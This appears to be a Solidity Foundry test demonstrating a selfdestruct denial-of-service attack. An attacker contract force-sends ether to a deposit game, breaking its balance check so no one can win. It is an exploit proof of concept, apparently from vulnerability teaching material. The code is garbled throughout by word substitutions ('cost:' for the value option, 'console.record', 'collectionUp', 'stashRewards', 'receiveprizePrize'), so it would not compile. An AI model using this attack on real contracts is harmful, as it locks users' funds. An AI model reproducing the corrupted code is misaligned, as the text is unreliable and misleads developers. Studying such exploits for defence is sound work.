pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherGame {
    uint public constant aimSum = 7 ether;
    address public winner;

    function stashRewards() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= aimSum, "Game is over");

        if (balance == aimSum) {
            winner = msg.sender;
        }
    }

    function receiveprizePrize() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{cost: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract PactTest is Test {
    EtherGame EtherGameAgreement;
    QuestRunner QuestrunnerAgreement;
    address alice;
    address eve;

    function collectionUp() public {
        EtherGameAgreement = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.record("Alice balance", alice.balance);
        console.record("Eve balance", eve.balance);

        console.record("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGameAgreement.stashRewards{cost: 1 ether}();

        console.record("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGameAgreement.stashRewards{cost: 1 ether}();

        console.record(
            "Balance of EtherGameContract",
            address(EtherGameAgreement).balance
        );

        console.record("Operator...");
        QuestrunnerAgreement = new QuestRunner(EtherGameAgreement);
        QuestrunnerAgreement.dos{cost: 5 ether}();

        console.record(
            "Balance of EtherGameContract",
            address(EtherGameAgreement).balance
        );
        console.record("operate completed, Game is over");
        EtherGameAgreement.stashRewards{cost: 1 ether}();
    }
}

contract QuestRunner {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {


        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}